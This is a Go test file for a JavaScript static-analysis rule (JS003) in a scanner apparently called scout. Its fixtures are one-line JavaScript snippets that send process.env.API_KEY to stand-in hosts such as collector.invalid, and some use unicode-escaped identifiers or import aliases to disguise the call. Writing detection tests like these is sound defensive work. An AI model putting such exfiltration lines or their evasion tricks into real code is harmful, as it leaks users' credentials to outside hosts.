//go:build !coreonly && cgo

package javascript_test

import (
	"errors"
	"strings"
	"testing"

	"github.com/skarm/scout"
	"github.com/skarm/scout/internal/analysis/document"
	"github.com/skarm/scout/internal/analysis/languages/javascript"
	"github.com/skarm/scout/internal/capture/artifact"
	"github.com/skarm/scout/report"
)

func TestUnsupportedPatternsStillShadowGlobalBindings(t *testing.T) {
	for _, tc := range []struct {
		name, setup string
		count       int
		limited     bool
	}{
		{"array", `const [fetch] = [()=>{}];`, 0, true},
		{"array rest", `const [...fetch] = [];`, 0, true},
		{"nested array", `const [[fetch]] = [[()=>{}]];`, 0, true},
		{"nested object", `const [{fetch}] = [{fetch:()=>{}}];`, 0, true},
		{"object rest", `const {...fetch} = {};`, 0, true},
		{"object default", `const {fetch=()=>{}} = {};`, 0, true},
		{"assignment", `let fetch=globalThis.fetch; [fetch]=[()=>{}];`, 0, true},
		{"escaped", `const [fe\u0074ch] = [()=>{}];`, 0, true},
		{"unrelated", `const [other] = [0];`, 1, true},
		{"restored", `let fetch; [fetch]=[()=>{}]; fetch=globalThis.fetch;`, 1, true},
		{"global", ``, 1, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			for _, ext := range []string{"js", "ts"} {
				const sink = `fetch('https://collector.invalid', {body:process.env.API_KEY})`
				text := tc.setup + "\n" + sink + ";"
				doc := document.Prepare(t.Context(), artifact.NewFile("input."+ext, []byte(text), false))
				found := false
				for _, rule := range javascript.Rules() {
					if rule.Rule().ID != "JS003" {
						continue
					}
					found = true
					result, err := rule.Find(t.Context(), doc, 10)
					if err != nil || result.Truncated != tc.limited || len(result.Matches) != tc.count {
						t.Fatalf("%s: result=%+v err=%v; want count=%d limited=%t", ext, result, err, tc.count, tc.limited)
					}
					for _, match := range result.Matches {
						if match.Start != len(tc.setup)+1 || match.End != len(text)-1 || text[match.Start:match.End] != sink {
							t.Fatalf("physical sink changed: %+v", match)
						}
					}
				}
				if !found {
					t.Fatal("JS003 is not registered")
				}
			}
		})
	}
}

func TestPublicScannerDestructuredParametersAreLocal(t *testing.T) {
	scanner, err := scout.New(t.Context(), scout.DefaultOptions())
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = scanner.Close() })
	for _, parameter := range []string{"[fetch]", "...[fetch]", "{entry: [fetch]}", "{...fetch}", "{fetch=()=>{}}"} {
		t.Run(parameter, func(t *testing.T) {
			text := "function send(" + parameter + ") { fetch('https://collector.invalid', {body:process.env.API_KEY}); }"
			doc := document.Prepare(t.Context(), artifact.NewFile("input.js", []byte(text), false))
			units := doc.Units()
			if len(units) != 1 || units[0].Status != report.UnitParsedLimited {
				t.Fatal("fixture must be valid JavaScript")
			}
			run, err := scanner.Scan(t.Context(), scout.Reader("input.js", strings.NewReader(text)))
			if err != nil && !errors.Is(err, scout.ErrIncomplete) {
				t.Fatal(err)
			}
			if len(run.Targets) != 1 || run.State != report.RunIncomplete {
				t.Fatal("unsupported value flow must retain its inspection gap")
			}
			if err := report.ValidateSealedRun(run); err != nil {
				t.Fatal(err)
			}
			for _, finding := range run.Targets[0].Analysis.Findings {
				if finding.RuleID == "JS003" {
					t.Fatalf("local parameter acquired global fetch semantics: %+v", finding)
				}
			}
		})
	}
}

func TestEnvironmentDestructuringPreservesCredentialEvidence(t *testing.T) {
	for _, tc := range []struct {
		name, declaration, value, origin string
	}{
		{name: "shorthand", declaration: `const {API_KEY} = process.env;`, value: "API_KEY", origin: "API_KEY"},
		{name: "alias", declaration: `const {API_KEY: key} = process.env;`, value: "key", origin: "API_KEY"},
		{name: "quoted alias", declaration: `const {"API_KEY": key} = process.env;`, value: "key", origin: `"API_KEY"`},
		{name: "escaped alias", declaration: `const {"API_\u004bEY": key} = process.env;`, value: "key", origin: `"API_\u004bEY"`},
		{name: "ordinary environment", declaration: `const {LANG: key} = process.env;`, value: "key"},
		{name: "ordinary object", declaration: `const {API_KEY: key} = {API_KEY: "public"};`, value: "key"},
		{name: "shadowed process", declaration: `const process = {env: {API_KEY: "public"}}; const {API_KEY: key} = process.env;`, value: "key"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			const sinkPrefix = `fetch("https://example.invalid", {body: `
			sink := sinkPrefix + tc.value + `})`
			text := tc.declaration + "\n" + sink + ";"
			doc := document.Prepare(t.Context(), artifact.NewFile("fixture.js", []byte(text), false))
			for _, rule := range javascript.Rules() {
				if rule.Rule().ID != "JS003" {
					continue
				}
				result, err := rule.Find(t.Context(), doc, 10)
				if err != nil || result.Truncated {
					t.Fatalf("incomplete analysis: %+v, %v", result, err)
				}
				if tc.origin == "" {
					if len(result.Matches) != 0 {
						t.Fatalf("ordinary value classified as credential: %+v", result)
					}
					return
				}
				if len(result.Matches) != 1 {
					t.Fatalf("credential alias lost: %+v", result)
				}
				match := result.Matches[0]
				if match.Start != len(tc.declaration)+1 || match.End != len(text)-1 || text[match.Start:match.End] != sink || len(match.Trace) != 2 {
					t.Fatalf("invalid sink evidence: %+v", match)
				}
				source, target := match.Trace[0], match.Trace[1]
				start := strings.Index(text, tc.origin)
				if source.Role != "source" || source.Start != start || source.End != start+len(tc.origin) ||
					target.Role != "sink" || target.Start != match.Start || target.End != match.End {
					t.Fatalf("invalid credential flow evidence: %+v", match.Trace)
				}
				return
			}
			t.Fatal("JS003 is not registered")
		})
	}
}

func TestEscapedIdentifiersPreserveBindingsAndEvidence(t *testing.T) {
	for _, tc := range []struct {
		name, text string
		count      int
	}{
		{"global", `fe\u0074ch('https://collector.invalid', {body:process.env.API_KEY});`, 1},
		{"local", `const fe\u0074ch=()=>{}; fetch('https://collector.invalid', {body:process.env.API_KEY});`, 0},
		{"parameter", `function send(fe\u{74}ch){fetch('https://collector.invalid', {body:process.env.API_KEY});}`, 0},
		{"member", `globalThis.fe\u0074ch('https://collector.invalid', {body:process.env.API_\u004bEY});`, 1},
		{"import alias", `import {post as se\u006ed} from 'axios'; send('https://collector.invalid', process.env.API_KEY);`, 1},
		{"namespace alias", `import * as ax\u0069os from 'axios'; axios.post('https://collector.invalid', process.env.API_KEY);`, 1},
		{"shorthand", `const {API_\u004bEY}=process.env; fetch('https://collector.invalid', {body:API_KEY});`, 1},
		{"string remains literal", `globalThis['fe\\u0074ch']('https://collector.invalid', {body:process.env.API_KEY});`, 0},
	} {
		t.Run(tc.name, func(t *testing.T) {
			for _, ext := range []string{"js", "ts"} {
				doc := document.Prepare(t.Context(), artifact.NewFile("fixture."+ext, []byte(tc.text), false))
				found := false
				for _, rule := range javascript.Rules() {
					if rule.Rule().ID != "JS003" {
						continue
					}
					found = true
					result, err := rule.Find(t.Context(), doc, 10)
					if err != nil || result.Truncated || len(result.Matches) != tc.count {
						t.Fatalf("%s: matches=%+v err=%v want=%d", ext, result, err, tc.count)
					}
					for _, m := range result.Matches {
						if m.Start < 0 || m.End > len(tc.text) || m.Start >= m.End || !strings.Contains(tc.text[m.Start:m.End], "collector.invalid") {
							t.Fatalf("invalid original sink span: %+v", m)
						}
						if len(m.Trace) != 2 {
							t.Fatalf("missing source/sink trace: %+v", m)
						}
						origin := "process.env.API_KEY"
						if tc.name == "member" {
							origin = `process.env.API_\u004bEY`
						}
						if tc.name == "shorthand" {
							origin = `API_\u004bEY`
						}
						start := strings.Index(tc.text, origin)
						if m.Trace[0].Start != start || m.Trace[0].End != start+len(origin) {
							t.Fatalf("source spelling/span lost: %+v", m.Trace[0])
						}
						for _, step := range m.Trace {
							if step.Start < 0 || step.End > len(tc.text) || step.Start >= step.End {
								t.Fatalf("invalid original trace span: %+v", step)
							}
						}
					}
				}
				if !found {
					t.Fatal("JS003 missing")
				}
			}
		})
	}
}
